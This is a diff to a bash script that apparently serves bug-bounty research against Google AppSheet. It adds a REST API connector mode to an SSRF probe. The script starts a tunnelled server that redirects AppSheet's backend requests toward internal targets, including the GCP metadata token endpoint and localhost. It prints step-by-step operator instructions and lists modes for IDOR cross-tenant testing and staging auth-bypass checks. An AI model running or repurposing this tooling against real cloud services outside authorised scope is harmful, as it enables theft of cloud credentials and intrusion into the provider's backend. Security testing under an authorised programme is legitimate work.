@@ -15,9 +15,11 @@
 #   4. Test IDOR cross-tenant with second Google account
 #
 # Usage:
-#   ./scripts/appsheet-ssrf-probe.sh --setup              # Start server + tunnel
+#   ./scripts/appsheet-ssrf-probe.sh --setup              # Start server + tunnel (OData connector)
 #   ./scripts/appsheet-ssrf-probe.sh --setup --target imds_all
 #   ./scripts/appsheet-ssrf-probe.sh --setup --target localhost_8080
+#   ./scripts/appsheet-ssrf-probe.sh --rest-connector     # Start server + tunnel (REST API connector — Session 4 priority, never tested)
+#   ./scripts/appsheet-ssrf-probe.sh --rest-connector --target imds_token
 #   ./scripts/appsheet-ssrf-probe.sh --staging            # Staging auth bypass verification
 #   ./scripts/appsheet-ssrf-probe.sh --idor --app-id <UUID> --token-b <KEY>
 #   PORT=8443 ./scripts/appsheet-ssrf-probe.sh --setup
@@ -46,10 +48,12 @@ scope_out="$("$SCRIPT_DIR/scope-check.sh" "appsheet.com" 2>/dev/null || echo OUT
 log "Scope: $scope_out"
 
 # ─── Mode: --setup (full SSRF server + tunnel) ───────────────────────────────
+# connector: "odata" (default, confirmed F002) or "rest" (untested, Session 4 priority)
 mode_setup() {
   local target="${1:-imds_token}"
   local custom_target="${2:-}"
-  local logfile="$RESULTS_DIR/ssrf-hits-$(date +%Y%m%d-%H%M%S).jsonl"
+  local connector="${3:-odata}"
+  local logfile="$RESULTS_DIR/ssrf-hits-${connector}-$(date +%Y%m%d-%H%M%S).jsonl"
   local tunnel_log
   tunnel_log="$(mktemp /tmp/lhr-XXXX.log)"
 
@@ -120,28 +124,53 @@ mode_setup() {
 
   # Instructions
   echo ""
-  echo "╔══════════════════════════════════════════════════════════════════════╗"
-  echo "║  AppSheet OData SSRF — Ready                                        ║"
-  echo "╠══════════════════════════════════════════════════════════════════════╣"
-  printf "║  URL (paste in AppSheet): %-44s║\n" "$tunnel_url"
-  echo "║  OData Version : 4.0                                                ║"
-  echo "║  Username      : testuser                                            ║"
-  echo "║  Password      : testpass1234                                        ║"
-  echo "║  SAP Gateway   : Is not SAP Gateway                                 ║"
-  echo "║  CSRF          : CSRF not required                                   ║"
-  echo "╠══════════════════════════════════════════════════════════════════════╣"
-  echo "║  Navigate to: appsheet.com/Account/ODataAuthInfo                    ║"
-  echo "╠══════════════════════════════════════════════════════════════════════╣"
-  echo "║  FLOW:                                                               ║"
-  echo "║  Step 1 — Test: AppSheet hits /\$metadata → server returns OData XML ║"
-  echo "║           AppSheet shows SUCCESS (not error) → save the connection  ║"
-  echo "║  Step 2 — Add the saved source to an app → open the app             ║"
-  echo "║           AppSheet fetches /Rows → server returns 302 → target      ║"
-  echo "║  Step 3 — Watch *** GCP BACKEND HIT *** lines (IP 35.x or 34.x)    ║"
-  echo "╠══════════════════════════════════════════════════════════════════════╣"
-  printf "║  Redirect target : %-51s║\n" "${custom_target:-$target}"
-  echo "║  Hit log         : $logfile"
-  echo "╚══════════════════════════════════════════════════════════════════════╝"
+  if [ "$connector" = "rest" ]; then
+    echo "╔══════════════════════════════════════════════════════════════════════╗"
+    echo "║  AppSheet REST API Connector SSRF — Ready (Session 4 priority)      ║"
+    echo "╠══════════════════════════════════════════════════════════════════════╣"
+    printf "║  URL (paste in AppSheet): %-44s║\n" "$tunnel_url"
+    echo "║  Auth type     : None (or Basic — testuser/testpass1234 to repeat   ║"
+    echo "║                  the credential-forwarding check F002 found)        ║"
+    echo "╠══════════════════════════════════════════════════════════════════════╣"
+    echo "║  Navigate to: App Editor → Data → Add Data Source → REST API        ║"
+    echo "║  (NOT OData — this is the untested sibling connector type)          ║"
+    echo "╠══════════════════════════════════════════════════════════════════════╣"
+    echo "║  FLOW:                                                               ║"
+    echo "║  Step 1 — Paste URL, set method (GET/POST), click Test/Connect      ║"
+    echo "║           Any response is fine — we only need the request to land   ║"
+    echo "║  Step 2 — If Test succeeds, save + add the source to an app, open it║"
+    echo "║           to trigger any follow-up data-fetch requests too          ║"
+    echo "║  Step 3 — Watch *** GCP BACKEND HIT *** lines (IP 35.x or 34.x)    ║"
+    echo "║  Step 4 — If confirmed: re-run with --target imds_token to repeat   ║"
+    echo "║           the IMDS TCP-reachability check from F002 on this client  ║"
+    echo "╠══════════════════════════════════════════════════════════════════════╣"
+    printf "║  Redirect target : %-51s║\n" "${custom_target:-$target}"
+    echo "║  Hit log         : $logfile"
+    echo "╚══════════════════════════════════════════════════════════════════════╝"
+  else
+    echo "╔══════════════════════════════════════════════════════════════════════╗"
+    echo "║  AppSheet OData SSRF — Ready                                        ║"
+    echo "╠══════════════════════════════════════════════════════════════════════╣"
+    printf "║  URL (paste in AppSheet): %-44s║\n" "$tunnel_url"
+    echo "║  OData Version : 4.0                                                ║"
+    echo "║  Username      : testuser                                            ║"
+    echo "║  Password      : testpass1234                                        ║"
+    echo "║  SAP Gateway   : Is not SAP Gateway                                 ║"
+    echo "║  CSRF          : CSRF not required                                   ║"
+    echo "╠══════════════════════════════════════════════════════════════════════╣"
+    echo "║  Navigate to: appsheet.com/Account/ODataAuthInfo                    ║"
+    echo "╠══════════════════════════════════════════════════════════════════════╣"
+    echo "║  FLOW:                                                               ║"
+    echo "║  Step 1 — Test: AppSheet hits /\$metadata → server returns OData XML ║"
+    echo "║           AppSheet shows SUCCESS (not error) → save the connection  ║"
+    echo "║  Step 2 — Add the saved source to an app → open the app             ║"
+    echo "║           AppSheet fetches /Rows → server returns 302 → target      ║"
+    echo "║  Step 3 — Watch *** GCP BACKEND HIT *** lines (IP 35.x or 34.x)    ║"
+    echo "╠══════════════════════════════════════════════════════════════════════╣"
+    printf "║  Redirect target : %-51s║\n" "${custom_target:-$target}"
+    echo "║  Hit log         : $logfile"
+    echo "╚══════════════════════════════════════════════════════════════════════╝"
+  fi
   echo ""
   info "Waiting for requests... (Ctrl+C to stop)"
   wait "$SERVER_PID"
@@ -286,7 +315,21 @@ case "$MODE" in
         *) shift ;;
       esac
     done
-    mode_setup "$TARGET_ARG" "$CUSTOM_ARG"
+    mode_setup "$TARGET_ARG" "$CUSTOM_ARG" "odata"
+    ;;
+
+  --rest-connector)
+    TARGET_ARG="imds_token"
+    CUSTOM_ARG=""
+    while [[ $# -gt 0 ]]; do
+      case $1 in
+        --target)        TARGET_ARG="$2"; shift 2 ;;
+        --custom-target) CUSTOM_ARG="$2"; shift 2 ;;
+        --port)          PORT="$2";       shift 2 ;;
+        *) shift ;;
+      esac
+    done
+    mode_setup "$TARGET_ARG" "$CUSTOM_ARG" "rest"
     ;;
 
   --staging)
